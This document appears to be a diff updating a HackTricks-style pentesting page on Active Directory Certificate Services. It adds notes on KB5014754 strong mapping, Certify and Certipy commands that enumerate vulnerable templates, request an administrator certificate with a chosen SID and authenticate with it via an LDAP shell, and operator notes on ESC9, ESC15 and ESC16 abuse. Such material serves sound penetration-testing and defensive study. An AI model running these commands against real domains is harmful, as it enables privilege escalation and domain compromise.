@@ -99,9 +99,18 @@ CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<do
 
 is central to establishing trust for certificate authentication.
 
+Since the **KB5014754** rollout, modern Kerberos certificate auth is mostly about **mapping strength**, not just EKUs. In hardened forests:
+
+- A certificate that only carries a **UPN/DNS SAN** may no longer be enough for logon.
+- The KDC prefers a **strong binding**, typically the **SID security extension** (`1.3.6.1.4.1.311.25.2`) or a strong explicit mapping in `altSecurityIdentities`.
+- If the cert lacks a strong mapping, DCs log **Kdcsvc Event ID 39/41** in compatibility mode and deny auth in enforcement mode.
+- In mixed attack paths, **ESC9/ESC16** matter because they strip the SID extension from issued certs; operators then rely on explicit mappings or SAN URL SID formats where the attack path supports them.
+
 ### Secure Channel (Schannel) Authentication
 
 Schannel facilitates secure TLS/SSL connections, where during a handshake, the client presents a certificate that, if successfully validated, authorizes access. The mapping of a certificate to an AD account may involve Kerberos’s **S4U2Self** function or the certificate’s **Subject Alternative Name (SAN)**, among other methods.
+
+Schannel is also the practical fallback when **PKINIT** is unavailable. For example, if a domain controller does not have a suitable **Smart Card Logon** certificate, `certipy auth`/PKINIT tooling may fail to get a TGT, but the same certificate can still be usable against **LDAPS** or **LDAP StartTLS** for authentication and LDAP operations.
 
 ### AD Certificate Services Enumeration
 
@@ -110,16 +119,27 @@ AD's certificate services can be enumerated through LDAP queries, revealing info
 Commands for using these tools include:
 
 ```bash
-# Enumerate trusted root CA certificates and Enterprise CAs with Certify
+# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
 Certify.exe cas
-# Identify vulnerable certificate templates with Certify
+
+# Identify vulnerable templates and dump relevant permissions
 Certify.exe find /vulnerable
+Certify.exe find /showAllPermissions
+Certify.exe pkiobjects /showAdmins
 
-# Use Certipy (>=4.0) for enumeration and identifying vulnerable templates
-certipy find -vulnerable -dc-only -u john@corp.local -p Passw0rd -target dc.corp.local
+# Certipy 5.x enumeration focused on enabled/vulnerable templates
+certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10
 
-# Request a certificate over the web enrollment interface (new in Certipy 4.x)
-certipy req -web -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
+# Save JSON/CSV output for offline review or BloodHound correlation
+certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10
+
+# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
+certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
+certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500
+
+# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell
 
 # Enumerate Enterprise CAs and certificate templates with certutil
 certutil.exe -TCAInfo
@@ -142,11 +162,17 @@ ad-certificates/domain-escalation.md
 
 ### Microsoft hardening timeline (KB5014754)
 
-Microsoft introduced a three-phase rollout (Compatibility → Audit → Enforcement) to move Kerberos certificate authentication away from weak implicit mappings. As of **February 11 2025**, domain controllers automatically switch to **Full Enforcement** if the `StrongCertificateBindingEnforcement` registry value is not set. Administrators should:
+Microsoft introduced a three-phase rollout (Compatibility → Audit → Enforcement) to move Kerberos certificate authentication away from weak implicit mappings. As of **February 11, 2025**, domain controllers automatically switch to **Full Enforcement** if the `StrongCertificateBindingEnforcement` registry value is not set. Microsoft later updated the timeline so fallback to compatibility mode remains possible until the **September 9, 2025** security update. Administrators should:
 
 1. Patch all DCs & AD CS servers (May 2022 or later).
 2. Monitor Event ID 39/41 for weak mappings during the *Audit* phase.
-3. Re-issue client-auth certificates with the new **SID extension** or configure strong manual mappings before February 2025. 
+3. Re-issue client-auth certificates with the new **SID extension** or configure strong manual mappings before enforcement blocks weak mappings.
+
+### Operator notes for hardened forests
+
+- **ESC1/ESC6 alone is no longer the whole story** in 2025+ environments. If you request a cert for another principal, you usually also need a strong mapping artifact such as the SID extension or an explicit mapping.
+- **ESC15 (EKUwu)** is mostly valuable in unpatched environments because it turns harmless **v1** templates such as **WebServer** into authentication- or enrollment-agent-capable certs by injecting **Application Policies**. Kerberos PKINIT still evaluates EKUs, but **LDAP Schannel** also honors Application Policies, which keeps LDAP-based abuse relevant.
+- **ESC16** is a CA-wide knob: if the CA disables the SID security extension globally, every issued certificate falls back toward weaker mapping behavior unless the attack chain injects a SID by another supported format.
 
 ---
 
@@ -167,9 +193,7 @@ Microsoft introduced a three-phase rollout (Compatibility → Audit → Enforcem
 ## References
 
 - [https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
+- [https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
 - [https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
 - [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
-- [https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
-- [https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
-- [https://advisory.eventussecurity.com/advisory/critical-vulnerability-in-ad-cs-allows-privilege-escalation/](https://advisory.eventussecurity.com/advisory/critical-vulnerability-in-ad-cs-allows-privilege-escalation/)
 {{#include ../../banners/hacktricks-training.md}}
